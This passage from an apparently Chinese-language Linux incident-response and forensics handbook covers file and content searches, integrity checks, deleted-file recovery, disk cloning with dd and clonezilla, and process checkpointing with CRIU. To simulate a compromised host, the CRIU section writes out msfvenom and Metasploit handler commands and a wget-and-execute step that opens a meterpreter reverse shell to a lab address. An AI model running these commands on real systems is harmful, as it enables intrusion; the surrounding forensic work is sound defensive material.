这是一种巧合情况，进程刚刚释放，在这一小段时间恰巧被大家捕捉到了，就可能显示为 `-`

### 3. clear

`clear

```
 这个没啥可说的，能 clear 的属于是幸运情况

### 3. LD_PRELOAD 等方法共享库劫持

可以看到，`ps` 和 `top` 都不是 `bash` 内置命令，而且都是动态链接的文件，因此会受到 `LD_PRELOAD` 这类共享库劫持的影响，可以通过 `busybox`来实现 `ps` 和 `top`

### 3. 文件上层目录存在 SBIT 权限

这种情况只存在于非 root 权限去删除其他用户创建的目录的情况，即使文件权限是 `777`也无法进行删除

以非 root 用户 join 删除 test1 用户创建的 `/tmp/test1_dir/test1.txt` 为例

### 4. echo 字符

`echo -e '\033c'

```
 通过发送终端重置字符来恢复终端

## 16. 小技巧

> 原文：https://books.noptrace.com/linux/15.%E5%B0%8F%E6%8A%80%E5%B7%A7/

### 0x01 查找文件

从环境变量查找文件

 - which

 只能查找系统命令的具体文件位置

 - whereis

 查找的类型不只是系统命令（二进制文件），还有一些其他文件，比如源文件等，在$PATH路径基础上增加了一些系统目录的查找，查找范围比which稍大，查找速度快

 - -b 只查找二进制文件
 - -B 指定寻找二进制文件的路径
 - -s 只搜索源文件
 - -S 指定搜索源文件的路径

 - locate

 从索引数据库(`/var/lib/mlocate/mlocate.db`)里查找文件，数据库每天更新，所以可能查到的文件不是最新的，甚至可能已经被删除了，可以使用 `updatedb` 来进行更新数据库

强烈建议在updatedb执行前查找一次，updatedb更新后查找一次

locate 默认会把包含所查询的字符的结果都显示出来，比如我们想查询 ls ，那么类似 tools 这种结果也会显示出来

我觉得locate 是一个很好的搜索工具，所以详细说几个参数

 - -b 只搜索文件名，不搜索文件夹名
 - -i 忽略大小写
 - -r "" 正则匹配

 - find

 find 是从文件系统中进行搜索，大而全，但是巨慢，以上命令都查找不到的时候再使用这个命令

find 默认文件和目录都会进行搜索，名称要准确，支持正则，可以使用通配符

-type 参数指定

d 目录

f  文件

l 符号链接

s socket

 - 基础使用 `find / -name evil.sh`
 - 忽略大小写 `find / -iname evil.sh`
 - 查找时排除某个/类文件 `find / -name *evil* ! -name *.log`
 - 查找时排除目录 `find / -name *evil* -path "/root/home/aaa" -prune`
 - 查找目录 `find / -type d -name eval`

 按照权限查找文件 -perm

 - 查找 777 权限的文件 `find / -type f -perm 777`
 - 查找 SUID 文件 `find / -perm /u=s`
 - 查找 SGID 文件 `find / -perm /g=s`
 - 查找 Sticky 文件 `find / -perm /o=t`

 基于所有者和组查找文件 -user / -group

 - 查找根目录下属于 root 的文件或文件夹 `find / -user root`
 - 查找ssh组的所有文件 `find / -group ssh`

 基于时间进行查找

-mtime  修改时间

 - 查找最近三天修改过的文件 `find / -mtime -3`
 - 查找三天前修改过的文件 `find / -mtime +3`
 - 查找最近24小时修改过的文件 `find / -mtime -1`

 -atime  访问时间

 - 查找3天内访问过的文件 `find / -atime -3`
 - 其他类似

 -ctime 属性修改时间,还未发现可以修改 ctime 的常规方法，所以可以作为依据

 - 寻找最近三天修改过属性的文件 `find / -ctime -3`

 -daystart 按天算，不是按照24小时算， -1 表示昨天，而不是从现在往前导24小时

 - 寻找昨天创建的文件 `find / -ctime 1 -daystart`
 - 寻找向前3~5 天之间编辑的文件 `find / -mtime 3 -mtime -5 -daystart`

 如果你觉得天这个单位太大了，可以使用分钟,分别对应 -mmin/-amin/-cmin

 - 查找三分钟前编辑的文件 `find / -mmin +3`
 - 查找三分钟内编辑的文件 `find / -mmin -3`
 - 查找三分钟前访问的文件 `find / -amin +3`
 - 查找三分钟内访问的文件 `find / -amin -3`
 - 查找三分钟前修改属性的文件 `find / -cmin +3`
 - 找三分钟内修改属性的文件 `find / -cmin -3`

 按照大小寻找文件 -size ，参数后单位可以为:

 - b  512-byte block
 - c   bytes
 - w  two-byte words
 - k
 - M
 - G

 - 寻找10M的文件 `find / -size 10M`
 - 寻找大于10M的文件 `find / -size +10M`
 - 寻找小于10M的文件 `find / -size -10M`
 - 寻找 10M到20M之间的文件 `find / -size +10MB -20M`

 参考文章:

https://zhuanlan.zhihu.com/p/35727707

https://cloud.tencent.com/developer/article/1348438

https://www.cnblogs.com/Q--T/p/7864795.html

https://www.linuxprobe.com/find-search-file.html

### 0x02 查找文件内容

很多时候，我们无法确定恶意程序的文件名，但是某些配置文件的关键字是不会更改的，所以我们可以利用关键字进行查找

`grep [OPTIONS] PATTERN [FILE...]`

首先介绍一下 grep 的参数，后面有常用案例

正则表达式相关参数

 - -E 扩展了正则表达式，支持了以下几种规则
 - +
 - ?
 - a|b
 - ()
 - x{m}
 - x{m,}
 - x{m,n}
 - -F 该参数后的正则表达式字符串中所有字符串都没有特殊含义，仅仅是其本身
 - -P 使用 perl 正则表达式
 - -e 正则表达式中存在 -- 的，默认会被识别为参数，使用 -e 参数可以将 -- 认定为正则表达式中的字符
 - -f file 从文件中加载正则
 - -i 忽略大小写
 - -w 只匹配完整的单词,比如 administrator 中包含 admin，使用 -w admin 是不会查询到结果的，只有 i am admin ! 这种才可以
 - -x 匹配整行
 - -z 跨行匹配

 杂项

 - -s 禁止输出因文件不存在或文件没有读权限而产生的错误信息
 - -v 反转结果，不显示制定的正则
 - -V 版本信息

 输出控制

 - -m NUM 匹配到NUM行后停止

 - -b 打印匹配的行在文件中的字节偏移量

 - -n 显示匹配的行号

 - -H 批量匹配时，显示匹配的文件名，默认参数

 - -h 与 H 相反，不显示文件名

 - -o 只输出匹配到的字符

 - -q 不显示任何东西

 - -a 匹配二进制数据

 - -I 不匹配二进制的内容

 - -d action 目录操作，读取(read)，递归(recurse)，跳过（skip)

 - -D action 设置对设备，FIFO,管道的操作，读取(read)，跳过(skip)

 - -r 递归,不会搜索符号连接内的内容，所以可以尽量使用 -R

 - -R 递归的同时可以设置一些选项，比如排除一些目录等

 - -L 显示未匹配到的文件名

 - -l 只显示匹配到的文件名

 - -c 打印每一个文件中匹配结果的行数

 文本控制

 - -B \<NUM> 显示查找到的行前的N行的内容

 - -A \<NUM> 显示查找到的行后的N行的内容

 - -C \<NUM> 显示查找都的行前后各N行的内容

 常见使用方法

 - 查找某个文件中的字符串

 `grep "str" evil.sh`

 - 在某个目录中的文件中搜索某个正则表达式

 `grep "str" /root/xxx/*`

 - 递归在某个目录下所有文件中进行查找

 `grep -rn "str" /root/xxxx/`

 - 查找多个字符

 - `grep "str1\|str2" /root/xxxx/*`

 - `grep -E "str1|str2" /root/xxxx/*`
 - `grep -e "str1" -e "str2" /root/xxxx/*`

 - 查找同时存在两个字符

 - `grep -E 'str1.*str2' /root/xxxx/*`

 - 只搜索部分文件

 - `grep 'abc' -r --include=*.conf /root/xxxx`

 - `grep 'abc' -r --include="*.{conf,config}" /root/xxxx`

 - 排除部分文件

 - `grep 'abc' --exclude=*.elf /root/xxxx`

 - `grep 'abc' --include=*.conf --exclude=*demo.conf`

 - 全盘搜索某个表达式

 `grep -Rn -i "str" /

```

如果匹配到的内容行太长，影响观看，可以考虑加入 `-l` 参数，只显示匹配到的文件名

 `grep -Rnl -i "str" /

```

### 0x03 确定系统相关信息

查看系统版本信息

 - `cat /etc/issue`
 - Ubuntu/Debian 系列适用
 - `cat /etc/lsb-release`
 - `lsb_release -a`
 - Redhat/Centos 系列适用
 - `cat /etc/redhat-release`

 查看系统是32位还是64位

 `x86_64 为64位
Intel 80386、i386、i486、i586、i686 等均为 32 位

```

 - `getconf LONG_BIT`
 - `uname -m`
 - `arch`
 - `hostnamectl`
 - `file /sbin/init` 或者 `file /lib/systemd/systemd`
 - `lscpu | grep "Architecture\|架构"`
 - `dpkg --print-architecture` [适用于Ubuntu类系统]
 - `dpkg-architecture -q DEB_BUILD_ARCH` [适用于Ubuntu类系统]

 查看内核版本信息

 - `cat /proc/version`
 - `uname -a`
 - `hostnamectl`

### 0x04 系统完整性检查

很多时候我们想知道系统是否存在系统命令、软件包等被替换的情况，可以使用下面的方法进行检查

需要在 root 权限下执行

RedHat/Centos

 - `rpm -Va`

 Ubuntu/Debian

 - `apt install debsums`

 - `debsums --all --changed`

### 0x05 系统文件监控工具

- AIDE - Advanced Intrusion Detection Environment
 - inotify
 - tripwire
 - Auditd

### 0x06 查看glibc版本

- ldd --version

### 0x07 文本比对

将要比对文本复制到 burpsuite 的 Compare 模块中 -> 粘贴进去 -> 使用words进行比对

不同的内容会有颜色标识

### 0x08 数据恢复

狡猾的攻击者往往会将自己留下的蛛丝马迹进行删除，此时，数据恢复就起到了重要作用

咱们就以管理员误删文件为背景来进行讲解

误删了文件，情况其实很简单，就两种： 被删除的文件有/无进程正在对其读写，有的话，那算事幸运，没有的话，自求多福。

### 0x09 批量查找文件并打印信息

这个命令在防守清理webshell的很有用，很适合批量截图，这里以搜索 `passwd` 这个文件为例

 `find / -name "passwd" | while read line; do if [ -f $line ]; then ls -al $line; elif [ -d $line ]; then ls -al ../ | grep $line; fi; done

```

### 0x10 拷贝取证

拷贝取证只是一部分人的需求，可能是取证人员，也可能是需要做交接的应急人员等，以下工具及使用方法可以作为参考

### 0x11 history 显示执行时间

history 信息默认是不显示命令执行的时间的，但是默认记录了时间，可以通过配置环境变量将时间显示出来

 `export HISTTIMEFORMAT='%F %T '

```

### 0x12 单独查看某个进程的日志

`journalctl -u 服务名称

```
 可以通过以下两条命令获取到相应的服务名称

 `systemctl list-units --type=service
service --status-all

```

### 0x13 如何暂停进程/冻结进程

### 0x14 查找特定时间段内的文件

把这部分单拿出来是因为应急溯源过程中用得太多了

### 0x15 内存中搜索字符串

使用如下脚本 `scan_memory.sh`

 `#!/bin/bash

# 要搜索的字符串
SEARCH_STRING="your_string_here"

# 遍历所有进程
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
    echo "Scanning PID $pid..."

    # 获取进程的内存映射
    map_file="/proc/$pid/maps"
    if [ ! -e "$map_file" ]; then
        continue
    fi

    # 遍历内存映射中的每一行
    while IFS= read -r line; do
        # 提取内存区域的起始地址和结束地址
        address=$(echo "$line" | awk '{print $1}')
        start_addr=$(echo "$address" | cut -d- -f1)
        end_addr=$(echo "$address" | cut -d- -f2)

        # 将起始地址和结束地址转换为十进制
        start_addr_dec=$((0x$start_addr))
        end_addr_dec=$((0x$end_addr))

        # 计算内存区域的大小
        size=$((end_addr_dec - start_addr_dec))

        # 读取并搜索内存区域
        mem_file="/proc/$pid/mem"
        if [ -e "$mem_file" ]; then
            dd if="$mem_file" bs=1 skip=$start_addr_dec count=$size 2>/dev/null | grep -a "$SEARCH_STRING" && echo "Found in PID $pid"
        fi
    done < "$map_file"
done

```
 例如搜索 `www.baidu.com`

可能同时搜索出来的进程不止一个，此时就需要根据实际情况进行测试和判断了

### 0x16 配置文件检查小技巧

Linux 上的程序配置文件较多，基本上都是 shell 脚本形式，普遍注释比较多，空行比较多，可以使用下面的命令进行筛选

 `grep -E -v '^\s*($|#)'  config_file

```
 直接查看结果如下

使用筛选命令查看如下

### 0x17 进程&amp;容器抓包

这里主要介绍一个工具 —— `ptcpdump`

https://github.com/mozillazg/ptcpdump

这款工具对标 tcpdump 工具，基于 bpf ，要求 `Linux kernel version >= 5.2`，增强功能有很多，比较重要的例如会保留流量对应进程、可以抓容器的包

这里演示两个功能，一个是抓包，查看包对应的进程信息；一个是抓指定进程的包

### 1. 安装

https://github.com/mozillazg/ptcpdump/releases

直接下载编译好的二进制即可

### 2. 演示抓包包含进程

使用方法几乎与 tcpdump 类似

 `sudo ptcpdump -i eth0 -w ptcpdump.pcapng

```

使用 Wireshark 打开此数据包

可以看到在 `Packet comments`部分包含进程 id、命令行、参数等信息，这是 tcpdump 没有的

手册中使用的 ptcpdump 版本为 `0.17.0` ，目前 `icmp` 数据包还没有进程相关的标记

这个项目还在开发过程中，相信在后续的版本应该会加上此功能

### 3. 演示抓指定进程的包

`sudo ptcpdump -i any --pid 1234

```
 看来目前通过筛选 pid 查 icmp 数据包也是不行的，我们换一个

其他协议目前是没问题的

### 存在进程对误删文件进行读写

这种情况简单来说就是被删除的文件在进程的内存空间还保存着一份，可以通过访问某个目录来找到文件恢复

接下来做一下这个实验

打开两个终端，终端1 和 终端2

终端1 ： 创建文件

终端2 ： 使用 cat 模拟一下进程持续读写 `111.txt`

终端1 ：删除 `111.txt`

可以看到，`111.txt` 已经被删除了

终端1 : lsof 查找文件占用并恢复

可以看到 `cat` 这个程序正在操作这个文件，进程 id 为 68048

终端1: 找到进程空间文件对应目录(`/proc/<pid>/fd`)，恢复文件

数据成功恢复

如果应用主程序被删除了，也就是该案例中的 `cat` ，则直接执行以下命令即可恢复可执行程序

 `cp /proc/<pid>/exe /tmp/xxx.elf

```

### 暂停/冻结 一个进程

`kill -SIGSTOP <pid>
kill -19 <pid>

```
 两条命令是一样的，执行其中一条即可，原理就是向其发送 `SIGSTOP` 信号，这个信号会使进程进入暂停状态

### 恢复/解冻 一个进程

`kill -SIGCONT <pid>
kill -18 <pid>

```
 同上，本次发送的信号是 `SIGCONT`

### 注意事项

查找创建文件并不是所有文件系统都支持，基本上所有的文件系统都支持 m、a、c 时间，即修改、访问、属性变动，因此查找文件创建时间基本上只能在支持记录文件创建时间的系统上进行，所以下面的讨论背景都是在支持创建时间的系统上

find 命令的man手册描述是支持根据创建时间查找的，但是经过测试，即使在支持记录创建时间的系统上也无法通过创建时间查找，简单来说就是目前还不兼容。

### 技巧解析

上面提到的查找方式都是单一维度的，要么是查找创建时间，要么是查找访问时间，如果进行稍稍改变，就可以组合查询，例如我想要查找在 `2024-07-31 09:33:00` 后访问过，且在 `2024-07-31 10:49:07` 前修改过的文件

 `find /path/to/search -type f -newerat "2024-07-31 09:33:00" ! -newermt "2024-07-31 10:49:07" 2>/dev/null

```

命令解析

 - `-type f`指定查找文件，而不是目录
 - `-newerat`  这不是命令其实是 -newerXY 下面会详细讲解
 - `!` 是取反
 - `2>/dev/null`  是不显示标准错误

 -newerXY  官方解析如下

这里的 X 和 Y 分别代表两种时间标记，如果被查找范围内文件的 X 的时间比参数指定的文件的 Y 更加 新 一些，则执行成功，其中 X 和 Y 取值如下：

 - a  访问时间
 - B  创建时间
 - c  inode 状态改变时间，一般认为是属性修改时间
 - m 修改时间
 - t  通过命令参数指定的时间

 其中 X 不可以取值 t

假设我们想查找属性修改时间(元数据修改，即ctime) 在 test.txt 文件的内容修改时间之后的文件

修改内容后，又被修改过属性的文件，即 ctime > mtime ，我们可以执行下列命令

 `find /path/to/search -type f -newercm test.txt 2>/dev/null

```

目前 Ubuntu Server 22.04 还不支持 B 选项

### 数据恢复程序

数据恢复程序的原理其实很简单，如果你读过《鸟哥的Linux私房菜》肯定知道，我们的文件 rm 删除之后，文件实体暂时还是在的，只不过文件所在的块已经被标记为删除了。就好像拆迁一样，我规划了要把你家拆迁，但是现在还没拆，只要手续都办完就会拆，所以我们应尽可能快地将数据恢复。

https://wizardforcel.gitbooks.io/vbird-linux-basic-4e/content/59.html

选择数据恢复程序来进行恢复有几点比较重要

 - 从误删除了文件的那一刻起，就不要再向文件所在的分区做任何写入工作了

当然了，很多时候已经在跑的程序不能停，那就要做好权衡了

 - 在不影响其他程序运行的情况下将误删文件所在的分区卸载掉(umount)

 - 在选择数据恢复软件前了解清楚文件系统类型

 - 恢复文件存储分区选择需要谨慎

 - 不能是之前误删文件的分区
 - 分区大小要大于之前误删文件的总大小

 - 有能力的话，可以考虑将分区备份一份

 常见的支持文件系统有：

 - 传统文件系统：ext2 / minix / MS-DOS / FAT （用 vfat 模块） / iso9660 （光盘）等等；
 - 日志式文件系统： ext3 /ext4 / ReiserFS / Windows' NTFS / IBM's JFS / SGI's XFS / ZFS
 - 网络文件系统： NFS / SMBFS

 查看当前 Linux 支持的文件系统

`ls -l /lib/modules/$(uname -r)/kernel/fs`

查看系统目前已载入到内存中支持的文件系统

`cat /proc/filesystems`

常见的 Linux 文件恢复工具

 - Extundelete
 - Debugfs
 - R-Linux
 - Ext3grep
 - Ext4magic
 - Testdisk

 数据恢复软件名称 支持文件系统类型 操作难易程度 最近一次更新 Extundelete ext3/ext4 中 2013/2/21 Debugfs ext2/ext3/ext4（新系统白费） 中 系统自带 R-Linux ext2/ext3/ext4 简单 2015/5/17 Ext3grep ext3 中 2010/4/19 Ext4magic ext3/ext4 中 2014/9/12 TestDisk 吹牛没输过，实战没赢过 复杂 2019/7/10 常见的系统急救工具(从崩溃的系统中copy文件)

 - Ddrescue
 - Avira Rescue System

### 查看误删除文件所在分区的文件系统类型

这里假设误删除文件为 `/opt/project/data.mdb`

 - `df -T /opt/project/`

`df -T` 命令可以直观得看到误删文件所在目录的挂在点，所在分区，以及分区的文件系统类型

 如果你不喜欢 df 命令或者系统上不存在df 命令，可以先确定一下目录所在分区，直接使用 `mount`和`lsblk -f` 命令

 - `mount`

 - `lsblk -f`

### 卸载误删文件所在的分区

如果卸载了该分区，那么该分区运行的程序和向该分区写入的操作都会终止，所以这个操作可能不会很顺利，需要权衡

如果该分区有程序正在运行或者有程序正在对该分区文件进行读写，是无法直接卸载的，需要停掉这些操作

还有就是不要想着把根目录卸载了，可以考虑其他方法，比如类似安全模式的东东

可以看到，`/opt/project` 所在分区为 `/dev/sdb`， 或者应该说 `/dev/sdb` 挂载在 `/opt/project` 目录下

卸载该分区 `umount /dev/sdb`

这样就将分区卸载掉了，卸载掉的分区数据还在，可以在后期重新挂载到某个目录下

### 虚拟化平台

- 使用自带的虚拟化快照功能
 - 直接把整个系统打包带走

### 全盘拷贝

全盘拷贝的工作模式基本上都是需要关机之后再用启动光盘或者U盘等引导，进而进行拷贝的，不然可能会数据错误，mondo rescue 是工作时打包拷贝的，但是对于 Ubuntu 16.04 及以上的系统，bug太多，根本用不了，推荐 clonezilla , 感觉速度更快一些

 - dd 系列

 - dd
 - dcfldd
 - ddrescue

 - G4L

 - clonezilla

### 进程拷贝

- CRIU

### 组合拳

全盘拷贝会让内存丢失，进程全无；进程拷贝限制进程所在的电脑系统

但是！ 如果我们将它们的优势组合起来，会有意想不到的惊喜，相信你已经懂了

组合拳分为三步

 - 冻结进程
 - 全盘拷贝
 - 恢复进程

 听起来有点像把大象关冰箱

上面的操作可以使我们不仅能够把系统全盘复制过来，还能保留比较可疑的进程信息

以上三步都是本文详细讲述过的内容，所以直接简述

新建反弹shell的进程

关机 -> 全盘拷贝 -> 新建虚拟机 -> 恢复

PS:这里有一个问题，恢复后的系统IP不会是原来的IP了，这会让进程恢复出现问题,所以需要修改IP为静态IP，同时需要网络设备配合，允许修改静态IP后的系统可以正常上网

我的两个系统网络环境相同，所以只需要修改静态IP就好

Ubuntu Server 20.04修改方法如下

 `cp /etc/netplan/00-installer-config.yaml .
sudo vim /etc/netplan/00-installer-config.yaml

# 将下面的配置写入该文件中，如果该文件有过定制，需要按照合适的方式配置
# This file describes the network interfaces available on your system
# For more information, see netplan(5).
network:
  version: 2
  renderer: networkd
  ethernets:
    eno1:
     dhcp4: no
     addresses: [192.168.1.2/24]
     gateway4: 192.168.1.1
     nameservers:
       addresses: [114.114.114.114]

```
 需要按照实际情况修改配置，以本次为例

网卡名称: `enp0s5`

IP地址: `192.168.31.16`

网关: `192.168.31.1`

即:

 `# This file describes the network interfaces available on your system
# For more information, see netplan(5).
network:
  version: 2
  renderer: networkd
  ethernets:
    enp0s5:
     dhcp4: no
     addresses: [192.168.31.16/24]
     gateway4: 192.168.31.1
     nameservers:
       addresses: [114.114.114.114]

```

开始恢复进程

只执行了一次，Kali Linux 便收到了反弹的shell

成功实现了系统和进程的双迁移！

### 关键文件取证

- Linux Evidence Acquisition Framework

https://github.com/alex-cart/LEAF

### 查找某段时间访问的文件(atime)

`find /path/to/search -type f -newerat "2024-07-19 12:30" ! -newerat "2024-07-19 15:28" 2>/dev/null

```

### 查找某段时间内创建的文件(btime)

此命令执行时间可能较长，会占用系统资源，而且需要系统支持创建时间记录

 `find / -type f -exec stat --format '%W %n' {} \; 2>/dev/null | awk -v start="$(date -d '2024-08-16 00:00:00' +%s)" -v end="$(date -d '2024-08-16 23:59:59' +%s)" '$1 != "0" && $1 >= start && $1 <= end {print $2}'

```

### clonezilla

clonezilla 也是一款分区和硬盘克隆工具，使用方式与G4L类似

https://clonezilla.org/

假设受害系统只有一块硬盘，此时需要将其内容全部克隆下来，之后带走做更加深入的分析、取证等，受害系统信息如下

下载 clonezilla  https://clonezilla.org/downloads.php

本次演示选择基于 Debian 的稳定版本 3.0.2-21

烧录进 U 盘

关闭受害主机，插上启动U盘，插上数据盘500G硬盘

直接选择默认的选项就好

语言选择简体中文

默认即可

选择默认的选项使用再生龙

这里模式就比较多了，本次演示主要是 硬盘->镜像文件-> 还原到硬盘 为主，这样容易复制，所以选择 device-image

选择本地设备 local_dev

clonezilla 这点很好，它支持在操作过程中插入数据盘，而不是必须从一开始就插入，因为最开始已经插入了500G数据盘，所以这里直接回车

这里已经识别出源数据盘（受害主机）为 /dev/sda ，而目的数据盘为 /dev/sdc ，直接 Ctrl + c结束掉这个界面

这里有点绕，简单来说就是把打包后的镜像放在哪个分区里，/dev/sdc 是我们的镜像，里面有一个 64G 大小的分区 sdc1 ，所以这里选中 sdc1

本次场景是全盘拷贝，不做坏道/坏块 检查以及系统修复,选择默认的第一个

选择存储打包后的镜像的目录，按照实际需求选择，之后选择 Done

选择初学模式

目前场景需要的是全盘复制，所以选择 savedisk

打包后的镜像的名字，默认是当前日期

选择源硬盘，当前场景受害主机只有一块硬盘，所以就是 sda

压缩方式，选择默认即可

是否检查和修正来源系统，选择跳过

这里选择是，让clonezilla 帮我们做一个简单的检查，当然，跳过会节省一些时间，演示选择是，请交叉保存的镜像

选择不对镜像加密

直接选默认的选项

输入 y

克隆完成，回车，poweroff

将镜像拿回公司，新建虚拟机，CD/DVD 放入 clonezilla ，从CD/DVD 启动

进入 clonezilla

步骤同上，直到这一步

目的硬盘就一块，也就不需要选择了

使用默认情况

因为刚刚检查过，这次就选否了

默认选项

y， 继续执行

再 y ,继续执行

重新配置新系统从硬盘启动

成功还原

### CRIU

https://criu.org/

https://github.com/checkpoint-restore/criu

CRIU （Checkpoint/Restore In Userspace） 是一种在用户空间创建和恢复节点的工具

简单来说，CRIU 可以将正在运行的程序冻结，转化成一些j镜像文件，理想情况下可以随时随地通过这些镜像文件从冻结的节点恢复系统运行，而这些操作都是在用户空间内完成的

CRIU 安装

 `sudo add-apt-repository ppa:criu/ppa
sudo apt-get update
sudo apt install criu

```

测试 CRIU 是否运行正常

 `sudo criu check

```
 输出 Looks good 表示安装成功

测试场景，受害主机某一个进程反弹 msf shell ，现在需要将其转储，在未来的某个时间节点在这台主机上重新让其运行

受害主机 Ubuntu Server 20.04 (192.168.31.16)

控制主机 Kali Linux (192.168.31.146)

控制主机 Kali Linux 生成木马(这里选择的是stegeless的木马，演示起来效果更好)

 `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.31.146 LPORT=4444 -f elf > shell.elf

```

控制主机 Kali Linux 设置监听

 `msfconsole -q
> use exploit/multi/handler
> set payload linux/x64/meterpreter_reverse_tcp
> set lhost 192.168.31.146
> set lport 4444
> set exitonsession false
> exploit -j

```

受害主机下载木马并执行

 `wget http://192.168.31.146/shell.elf
chmod +x shell.elf
./shell.elf &

```

反弹木马进程号 1267

控制主机 Kali Linux 接收到返回的shell

新开一个ssh连接，连接被害主机，安装 criu

在受害主机上使用 criu 对 pid 为 1267 对进程进行转储

 `sudo criu dump -vvvv -o dump.log -t 1267 --shell-job --tcp-established

```

此时查看控制主机 Kali Linux 处反弹shell 是否依旧正常

此时连接已经断了

静待五分钟，用来模拟正常应急中因为各种原因造成的时间间隔

恢复进程执行

 `sudo criu restore -vvvv --shell-job --tcp-established

```

控制主机 Kali Linux 这一侧

再次收到了反弹shell的请求

此时便可以继续对该进程进行研究了，但是总感觉有些鸡肋

假如说当前这台主机关机了，重启后，保存的进程镜像还能够再次恢复吗？

关闭受害主机，Kali Linux 保持监听

尝试恢复反弹shell的进程

还原失败，并且当前的终端输入字符已经无法看见了

再次启动一个ssh 连接，多次尝试恢复进程，这次 echo 123 并且睡眠3秒，这样即使看不到输入，也可以凭借着输出来判断是否是我们想执行的命令

仍旧失败，多次尝试之后，终于成功了

也就是说可以先将一个程序冻结，之后系统随意关机，再次开机后可以恢复进程，进行分析，这样看起来，是不是有点意思了呢

但是这还不够，看下面

### 查找某段时间内修改属性的文件(ctime)

`find /path/to/search -type f -newerct "2024-07-19 12:30" ! -newerct "2024-07-19 15:28" 2>/dev/null

```

### dd

dd 是 Linux 发行版基本都带的工具，可以用来做的事情也非常多，这里我们只演示用来全盘拷贝的功能

dcfldd 和 ddrescue 都是dd升级版或者辅助工具，建议大家了解一下

PS：使用dd命令进行全盘或者部分分区复制强烈建议准备一个LiveCD，建议使用Ubuntu Desktop 22.04启动U盘作为这个LiveCD；同时需要准备一个空的数据存储盘，空间要大于要复制的硬盘或者分区

使用dd进行复制的时候，需要将系统关闭，之后使用准备好的启动U盘进入 Ubuntu 22.04 中进行复制操作了，这也就意味着全盘拷贝是看不到恶意程序的进程情况的

假设受害系统只有一块硬盘，此时需要将其内容全部克隆下来，之后带走做更加深入的分析、取证等，受害系统信息如下

制作启动U盘

关闭受害系统，插上U盘，设置U盘启动，进入LiveCD

确定要备份的硬盘名称以及具体信息

 `sudo lsblk -a
sudo fdisk -l

```

确定我们要复制的源硬盘的设备名称为 `/dev/sda`，这块硬盘有三个分区，使用的是 GPT 分区表，硬盘总大小为 16G

接入用来备份的数据盘 500G

查看数据盘信息

 `sudo lsblk -a

```

数据盘总大小为 500G，硬盘设备名称为 `/dev/sdc`,有两个分区，现在我们删除这些分区，新建一个只有20G大小的分区就够了

 `sudo fdisk /dev/sdc

```

格式化 `/dev/sdc1` 分区

 `sudo mkfs.ext4 /dev/sdc1

```

新建 `/data` 目录，将 `/dev/sdc1` 挂载到该位置

 `sudo mkdir /data
sudo mount /dev/sdc1 /data

```

使用 dd 命令将 `/dev/sda` 硬盘中的所有分区的所有内容拷贝到 /data 目录中的一个文件里，文件名以 ubuntu-sda 来命名

 `sudo dd if=/dev/sda of=/data/ubuntu-sda bs=5M

```
 默认是看不到进度的，执行dd后，需要新开一个终端窗口，执行下面的命令来让 dd 显示进度

 `sudo watch -n 5 killall -USR1 dd

```

此时 `/dev/sda` 这块硬盘中的内容已经全部复制到 ubuntu-sda 文件中，此时已经可以复制多份，并且拿出一份测试系统是否可以正常启动

新建一个虚拟机，使用 CD/DVD 镜像Ubuntu 22.04 作为启动源，当然也可以使用之前做的启动U盘

硬盘容量大于 ubuntu-sda 文件的大小，这里直接以 64G 为例

插入刚刚拷贝的数据盘

根据硬盘大小等信息，可以确定新系统的硬盘设备名称为 `/dev/sda`  数据盘的设备名称为 `/dev/sdb`数据盘有一个分区 `/dev/sdb1` 已经挂载在某一个路径下了，但是路径有点长，还是新建 `/data` 目录，挂载到其上

 `sudo umount /dev/sdb1
sudo mkdir /data
sudo mount /dev/sdb1 /data

```

使用 dd 将拷贝的信息恢复到这块64G的硬盘上 (`/dev/sda`)

 `sudo dd if=/data/ubuntu-sda of=/dev/sda bs=5M

```
 新开终端执行监控指令

 `sudo watch -n 5 killall -USR1 dd

```

从 `/dev/sda` 硬盘结构上看已经恢复了，现在测试看能不能正常运行

成功启动，克隆成功，克隆的镜像可以直接作为取证材料或者交由其他应急响应人员分析、探究

### Debugfs

这个程序是系统自带的一个交互式文件系统调试器，在 Centos 6 上可以用来做数据恢复

https://man7.org/linux/man-pages/man8/debugfs.8.html

支持 ext2、ext3、ext4

Centos 7 以及 Ubuntu 16.04 已经不能恢复了

### Ext3grep

http://manpages.ubuntu.com/manpages/jammy/man8/ext3grep.8.html

仅支持 ext3

安装 Ext3grep

`apt install ext3grep`

现在 `/dev/sdb` 挂载在 `/opt/project`下，我们在这个目录下创建一个文件 `test1.txt`

我们删除 `test1.txt` 并使用 `Ext3grep` 进行文件恢复

 - 卸载 `test1.txt` 所在分区

`umount /dev/sdb`

 - 扫描指定文件系统的根路径

`ext3grep /dev/sdb  --ls --inode 2`

/dev/sdb 是本次实验的文件系统，大家按照实际情况替换就好

--inode 2 是指根路径

可以看到成功找到了 `test1.txt` ，前面的 `D` 标志就是表示文件被删除了，而不是 “D 之一族”

 - 获取文件存在时候的具体路径

`ext3grep /dev/sdb  --dump-names`

可以看到，就在根目录

 - 恢复被删除的文件 `test1.txt`

`ext3grep /dev/sdb  --restore-file test1.txt`

数据恢复成功，恢复后的数据会储存在执行 `ext3grep` 命令的路径下的 `RESTORED_FILES`文件夹内

 - 恢复全部数据

如果你遇到的情况是不小心格式了一个分区，那可以试一下大招

`ext3grep /dev/sdb  --reatore-all`

 - 重新挂载分区

`mount /dev/sdb /opt/project`

 看起来一切很顺利，但是当我测试直接删除一个目录的时候/删除非根目录下的文件，恢复起来就会有问题，大家可以多尝试一下

### Ext4magic

这个工具非常好用

http://ext4magic.sourceforge.net/howto_en.html

ext3、ext4

这次我们玩儿得复杂点，玩点儿 ext3grep 做不到的(我的知识范围内)

我们在挂载的目录下创建了一个文件夹 `aaa`,在其中创建文件夹 `bbb`,在 `bbb`文件夹中新建 `ccc.txt`,还写入了一些字符，之后直接删除了 bbb 文件夹，接下来我们开始文件恢复

 - 卸载 `test1.txt` 所在分区

`umount /dev/sdb`

 - 扫描指定文件系统所有的根路径

`ext4magic /dev/sdb -f /`

/dev/sdb 是本次实验的文件系统，大家按照实际情况替换就好

可以看到到 `aaa`这个文件夹，毕竟还在文件系统里嘛，我们没有删除`aaa`文件夹，我们能成功找到 `bbb` 和`ccc.txt`吗？

 - 扫描子文件夹中的内容

`ext4magic /dev/sdb -f /aaa/`

继续寻找 `ext4magic /dev/sdb -f /aaa/bbb/`

可以看到，此时直接这样查找就不行了，我们需要加上 `-T -x`参数

 - 恢复被删除的文件 `ccc.txt`

